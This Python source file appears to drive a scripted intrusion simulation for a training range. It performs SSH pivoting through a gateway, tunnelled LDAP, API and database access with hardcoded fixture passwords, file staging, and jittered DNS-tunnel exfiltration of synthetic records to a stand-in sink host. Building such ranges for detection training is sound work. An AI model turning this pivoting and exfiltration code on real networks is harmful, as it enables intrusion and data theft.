"""Fixed, range-local intrusion simulation. No exploits or real data collection."""
import base64
from contextlib import contextmanager
from dataclasses import dataclass, replace
from datetime import datetime, timedelta, timezone
import hashlib
from http.client import HTTPConnection
import json
import math
import os
from pathlib import Path
import random
import shlex
import socket
import socketserver
import struct
import subprocess
import threading
import time
import urllib.request

START = datetime(2026, 1, 12, 8, tzinfo=timezone.utc)
DURATION = 86400
SINK = 'scenario-sink.dmz'
DNS_SINK = 'scenario-sink.internal'
GATEWAY = 'vpn-gw-01.dmz'
FILE_HOST = 'file-01.internal'
SUFFIX = '.telemetry.range.test'
LOG_DIR = Path('/var/log/simulated-users')
STORY_DIR = Path('/var/log/range-instructor')
CLOCK_FILE = LOG_DIR/'clock.json'
STAGE_DIR = '/tmp/report-cache'
STAGE_FILE = STAGE_DIR+'/export.jsonl'
EXFIL_PERIOD = 675  # Simulated seconds; carrier for the timing-analysis exercise.
DEFAULT_SEED = 20260112
EXFIL_JITTER_LIMIT = .42  # Phase jitter, not cumulative interval drift.


def simulation_seed(value):
    seed = int(value)
    if str(seed) != str(value) or not 0 <= seed <= 2**32-1:
        raise ValueError('Seed must be an integer between 0 and 4294967295')
    return seed


def rng_for(seed, stream):
    """Independent PRNG streams: unrelated draws never shift another behaviour."""
    seed = simulation_seed(seed)
    digest = hashlib.sha256(f'{seed}:{stream}'.encode()).digest()
    return random.Random(int.from_bytes(digest, 'big'))


def office_modulation(seed, elapsed):
    """Smooth, light 30-minute intensity variation; independent of loop timing."""
    bucket = max(0, elapsed)/1800
    index = int(bucket)
    fraction = bucket-index
    fraction = fraction*fraction*(3-2*fraction)
    a = rng_for(seed, f'office.intensity.{index}').uniform(.85, 1.15)
    b = rng_for(seed, f'office.intensity.{index+1}').uniform(.85, 1.15)
    return a+(b-a)*fraction


def exfil_offsets(seed=DEFAULT_SEED):
    """32 reproducible, jittered slots; retain a carrier without clockwork gaps.

    Independently perturb each nominal slot instead of accumulating random
    delays. The latter would wash out the carrier. The phase bound preserves
    ordering and keeps every synthetic transfer inside hours 16–22.
    """
    rng = rng_for(seed, 'dns.schedule')
    anchor = 16*3600+EXFIL_JITTER_LIMIT*EXFIL_PERIOD
    return tuple(round(anchor+i*EXFIL_PERIOD+EXFIL_PERIOD*max(-EXFIL_JITTER_LIMIT,
        min(EXFIL_JITTER_LIMIT, rng.gauss(0, .25)))) for i in range(32))


def clock_speed(value):
    speed = float(value)
    if not math.isfinite(speed) or not 1 <= speed <= 3600:
        raise ValueError('Clock speed must be finite and between 1 and 3600')
    return speed


class Clock:
    def __init__(self, speed=1, started=None, seed=DEFAULT_SEED):
        self.seed = simulation_seed(seed)
        self.speed = clock_speed(speed)
        self.started = time.monotonic() if started is None else float(started)

    @property
    def elapsed(self):
        return max(0, min(DURATION, (time.monotonic()-self.started)*self.speed))

    @property
    def now(self):
        return START+timedelta(seconds=self.elapsed)

    def publish(self, path=CLOCK_FILE):
        save_json(path, {'speed': self.speed, 'started': self.started, 'seed': self.seed})

    @classmethod
    def load(cls, path=CLOCK_FILE):
        state = json.loads(path.read_text())
        return cls(state['speed'], state['started'], state.get('seed', DEFAULT_SEED))


def save_json(path, state):
    pending = path.with_suffix('.tmp')
    pending.write_text(json.dumps(state)+'\n')
    pending.replace(path)


def fixture(index):
    if not 0 <= index < 32:
        raise ValueError('Invalid fixture index')
    return f'SYNTHETIC-ONLY|fixture={index:02d}|customer=Example|amount=0000'


def staged_data():
    return '\n'.join(json.dumps({'record': fixture(i)}) for i in range(32))+'\n'


def dns_packet(index):
    label = base64.b32encode(fixture(index).encode()).decode().rstrip('=').lower()
    labels = [*[label[i:i+50] for i in range(0, len(label), 50)],
              'telemetry', 'range', 'test']
    wire = b''.join(bytes([len(part)])+part.encode() for part in labels)+b'\0'
    return '.'.join(labels), struct.pack('!6H', index, 0x0100, 1, 0, 0, 0)+wire+struct.pack('!HH', 1, 1)


def http(path, marker=False):
    request = urllib.request.Request('http://'+SINK+':8080'+path,
        data=b'{}' if marker else None,
        headers={'User-Agent': 'python-requests/2.31.0', 'Content-Type': 'application/json'})
    with urllib.request.urlopen(request, timeout=3) as response:
        return response.read(1024).decode()


def probe_ssh():
    with socket.create_connection((SINK, 2222), timeout=3) as sock:
        banner = sock.recv(128).decode('ascii').strip()
        sock.sendall(b'SSH-2.0-OpenSSH_9.6\r\n')
    return {'banner': banner, 'exploit': False}


@contextmanager
def ssh_client(host, username='devuser', via=None):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    channel = None
    try:
        if via:
            channel = via.get_transport().open_channel('direct-tcpip', (host, 22), ('127.0.0.1', 0), timeout=4)
        client.connect(host, username=username,
                       password='admin123' if username == 'sysadmin' else 'devuser2024',
                       sock=channel, look_for_keys=False, allow_agent=False,
                       timeout=4, auth_timeout=4, banner_timeout=4)
        yield client
    finally:
        client.close()
        if channel:
            channel.close()


def execute(client, command):
    _, stdout, stderr = client.exec_command(command, timeout=5)
    data = stdout.read(16384)
    if stdout.channel.recv_exit_status() != 0:
        raise RuntimeError('Fixed simulation command failed: '+stderr.read(512).decode(errors='replace'))
    return data.decode('utf-8')


def python(client, source):
    return execute(client, 'python3 -c '+shlex.quote(source))


@contextmanager
def gateway():
    with ssh_client(GATEWAY) as client:
        yield client


@contextmanager
def lateral():
    # Internal SSH originates from the gateway, not the DMZ runner.
    with gateway() as pivot:
        with ssh_client(FILE_HOST, via=pivot) as client:
            yield client


@contextmanager
def tunnel(pivot, host, port):
    """One local protocol client, one fixed SSH-forwarded destination."""
    class Forward(socketserver.BaseRequestHandler):
        def handle(self):
            import select
            channel = None
            try:
                channel = pivot.get_transport().open_channel('direct-tcpip', (host, port), ('127.0.0.1', 0), timeout=4)
                end = time.monotonic()+8
                while time.monotonic() < end:
                    readable, _, _ = select.select([self.request, channel], [], [], .2)
                    for source in readable:
                        data = source.recv(8192)
                        if not data:
                            return
                        (channel if source is self.request else self.request).sendall(data)
            except OSError:
                pass
            finally:
                if channel:
                    channel.close()
    server = socketserver.TCPServer(('127.0.0.1', 0), Forward)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1]
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=9)


@dataclass(frozen=True)
class Event:
    offset: int
    kind: str
    phase: str
    target: str
    requires: tuple = ()
    grant: str = ''
    index: int = -1


BASE_EVENTS = (
    Event(1800, 'java-probe', 'reconnaissance', SINK, grant='java-seen'),
    Event(3600, 'ssh-probe', 'reconnaissance', SINK),
    Event(7200, 'initial-access', 'foothold', SINK, ('java-seen',), 'foothold'),
    Event(8100, 'gateway-login', 'foothold', GATEWAY, ('foothold',), 'gateway'),
    Event(10800, 'host-discovery', 'discovery', GATEWAY, ('gateway',), 'host-discovered'),
    Event(14400, 'service-discovery', 'discovery', GATEWAY, ('host-discovered',), 'services-discovered'),
    Event(18000, 'directory-enumeration', 'discovery', 'ldap.internal', ('services-discovered',), 'directory'),
    Event(25200, 'api-enumeration', 'discovery', 'app-01.internal', ('gateway',)),
    Event(28800, 'credential-access', 'credential-access', SINK, ('directory',), 'fixture-credentials'),
    Event(32400, 'privilege-context', 'privilege-escalation', GATEWAY, ('fixture-credentials',), 'account-context'),
    Event(36000, 'lateral-login', 'lateral-movement', FILE_HOST, ('account-context',), 'lateral'),
    Event(39600, 'synthetic-collection', 'collection', 'db-01.internal', ('lateral',), 'collection'),
    Event(46800, 'stage-data', 'staging', FILE_HOST, ('collection',), 'staged'),
    Event(50400, 'verify-stage', 'staging', FILE_HOST, ('staged',), 'verified'),
    Event(82800, 'objective-complete', 'completion', SINK,
          tuple(f'chunk-{i}' for i in range(32)), 'objective'),
)


def build_events(seed=DEFAULT_SEED):
    rng = rng_for(seed, 'story.schedule')
    events = [replace(event, offset=event.offset+round(max(-90, min(90, rng.gauss(0, 30)))))
              for event in BASE_EVENTS]
    events.extend(Event(offset, 'dns-exfil', 'exfiltration', FILE_HOST, ('verified',), f'chunk-{i}', i)
                  for i, offset in enumerate(exfil_offsets(seed)))
    return tuple(sorted(events, key=lambda event: event.offset))


EVENTS = build_events()


class Story:
    def __init__(self, seed=DEFAULT_SEED):
        self.seed = simulation_seed(seed)
        self.events = build_events(self.seed)
        self.index = 0
        self.grants = set()
        self.counts = {'ok': 0, 'error': 0, 'blocked': 0}

    @property
    def state(self):
        return {'seed': self.seed, 'events_processed': self.index, 'events_total': len(self.events),
                'grants': sorted(self.grants), 'results': self.counts.copy(),
                'objective': 'complete' if 'objective' in self.grants else
                             'incomplete' if self.index == len(self.events) else 'pending'}

    def perform(self, event, now):
        started = time.monotonic()
        result = {'time': datetime.now(timezone.utc).isoformat(), 'scenario_time': now.isoformat(),
                  'simulated': True, 'actor': 'intruder-01', 'activity': event.kind,
                  'phase': event.phase, 'target': event.target, 'scheduled_seconds': event.offset,
                  'initiator': 'attacker-01.dmz',
                  'source': FILE_HOST if event.kind == 'dns-exfil' else GATEWAY if event.kind in
                      ('host-discovery', 'service-discovery', 'directory-enumeration',
                       'api-enumeration', 'lateral-login', 'synthetic-collection',
                       'stage-data', 'verify-stage') else 'attacker-01.dmz',
                  'index': event.index}
        missing = sorted(set(event.requires)-self.grants)
        if missing:
            result.update(result='blocked', missing=missing)
        else:
            try:
                result.update(result='ok', detail=self.act(event))
                if event.grant:
                    self.grants.add(event.grant)
            except Exception as error:
                result.update(result='error', error=type(error).__name__, detail=str(error)[:512])
        result['duration_ms'] = round((time.monotonic()-started)*1000)
        self.counts[result['result']] += 1
        self.index += 1
        return result

    def act(self, event):
        kind = event.kind
        if kind == 'java-probe':
            return http('/status')
        if kind == 'ssh-probe':
            return probe_ssh()
        if kind in ('initial-access', 'credential-access', 'objective-complete'):
            # Explicit simulation markers, not exploit/credential theft endpoints.
            paths = {'initial-access': '/api/session', 'credential-access': '/api/profile',
                     'objective-complete': '/api/status'}
            return json.loads(http(paths[kind], marker=True))
        if kind == 'gateway-login':
            with gateway() as client:
                return {'identity': execute(client, 'id -un').strip(), 'access': 'public-fixture-password'}
        if kind == 'host-discovery':
            with gateway() as client:
                return execute(client, 'hostname; id; ip -brief address')
        if kind == 'service-discovery':
            source = '''import socket,json
results=[]
for host,port in [('ldap.internal',389),('app-01.internal',3000),('file-01.internal',22),('db-01.internal',3306)]:
    address=socket.gethostbyname(host)
    with socket.create_connection((host,port),timeout=1):
        results.append({'host':host,'address':address,'port':port})
print(json.dumps(results))'''
            with gateway() as client:
                return json.loads(python(client, source))
        if kind == 'directory-enumeration':
            with gateway() as client, tunnel(client, 'ldap.internal', 389) as port:
                output = subprocess.check_output(['ldapsearch', '-x', '-H', f'ldap://127.0.0.1:{port}',
                    '-b', 'dc=enum,dc=lab', '-z', '12', '(uid=*)', 'dn', 'uid'],
                    timeout=7, stderr=subprocess.PIPE).decode()
                if 'dn:' not in output:
                    raise RuntimeError('No directory fixture entries: '+output[:512])
                return {'entries': output.count('dn:'), 'source': 'gateway SSH channel'}
        if kind == 'api-enumeration':
            with gateway() as client:
                channel = client.get_transport().open_channel('direct-tcpip', ('app-01.internal', 3000), ('127.0.0.1', 0), timeout=4)
                connection = HTTPConnection('app-01.internal', 3000, timeout=4)
                connection.sock = channel
                try:
                    connection.request('GET', '/api/users/2?view=summary', headers={'User-Agent': 'python-requests/2.31.0'})
                    response = connection.getresponse()
                    response.read(8192)
                    if response.status != 200:
                        raise RuntimeError('API fixture unavailable')
                    return {'status': response.status, 'source': 'gateway SSH channel'}
                finally:
                    connection.close()
        if kind == 'privilege-context':
            # Fixture account switch only. Never invokes sudo, SUID or a root shell.
            with ssh_client(GATEWAY, username='sysadmin') as client:
                identity = execute(client, 'id -un').strip()
                if identity != 'sysadmin':
                    raise RuntimeError('Unexpected fixture account')
                return {'identity': identity, 'escalation': 'emulated-account-context', 'root': False}
        if kind == 'lateral-login':
            with lateral() as client:
                return {'identity': execute(client, 'hostname; id -un'), 'via': GATEWAY, 'source': GATEWAY}
        if kind == 'synthetic-collection':
            # A real logged SQL query returning literals only, never customer tables.
            query = "/* report_export */ SELECT 'SYNTHETIC-ONLY', 'Example', '0000'"
            with gateway() as client, tunnel(client, 'db-01.internal', 3306) as port:
                output = subprocess.check_output(['mariadb', '--skip-ssl', '--comments', '--protocol=TCP',
                    '-h', '127.0.0.1', '-P', str(port), '-u', 'app_user', '--connect-timeout=4',
                    '--batch', '-N', '-e', query], env=dict(os.environ, MYSQL_PWD='S3cretDB!2024'),
                    timeout=7, stderr=subprocess.PIPE).decode()
                if 'SYNTHETIC-ONLY' not in output:
                    raise RuntimeError('Synthetic query failed')
                return {'sql_fixture_rows': 1, 'generated_records': 32,
                        'data_source': 'generated literals only', 'source': GATEWAY}
        if kind in ('stage-data', 'verify-stage'):
            data = staged_data().encode()
            digest = hashlib.sha256(data).hexdigest()
            # Exclusive creation; never overwrite an existing path or follow symlinks.
            if kind == 'stage-data':
                source = f'''import os,base64,json
os.mkdir({STAGE_DIR!r},0o700)
fd=os.open({STAGE_FILE!r},os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
with os.fdopen(fd,'wb') as f:
    f.write(base64.b64decode({base64.b64encode(data).decode()!r}))
print(json.dumps({{'bytes':{len(data)},'sha256':{digest!r}}}))'''
            else:
                source = stage_verification()+"\nprint(json.dumps({'sha256':digest,'verified':True}))"
            with lateral() as client:
                return json.loads(python(client, source))
        if kind == 'dns-exfil':
            name, packet = dns_packet(event.index)
            # Verify the exact synthetic fixture; transmit a generated chunk, never file contents.
            source = stage_verification()+f'''
import socket,base64
packet=base64.b64decode({base64.b64encode(packet).decode()!r})
with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as sock:
    sock.settimeout(3)
    sock.connect(({DNS_SINK!r},1053))
    sock.send(packet)
    reply=sock.recv(512)
    assert reply[:2]==packet[:2] and reply[2]&128 and reply[3]&15==0
print(json.dumps({{'query':{name!r},'source':{FILE_HOST!r},'bytes':len(packet)}}))'''
            with lateral() as client:
                return json.loads(python(client, source))
        raise ValueError('Unknown fixed scenario action')


def stage_verification():
    digest = hashlib.sha256(staged_data().encode()).hexdigest()
    return f'''import os,stat,hashlib,json
assert not os.path.islink({STAGE_DIR!r})
fd=os.open({STAGE_FILE!r},os.O_RDONLY|os.O_NOFOLLOW|os.O_NONBLOCK)
with os.fdopen(fd,'rb') as f:
    st=os.fstat(f.fileno())
    assert stat.S_ISREG(st.st_mode) and st.st_uid==os.getuid() and st.st_size=={len(staged_data().encode())}
    digest=hashlib.sha256(f.read({len(staged_data().encode())+1})).hexdigest()
assert digest=={digest!r}'''
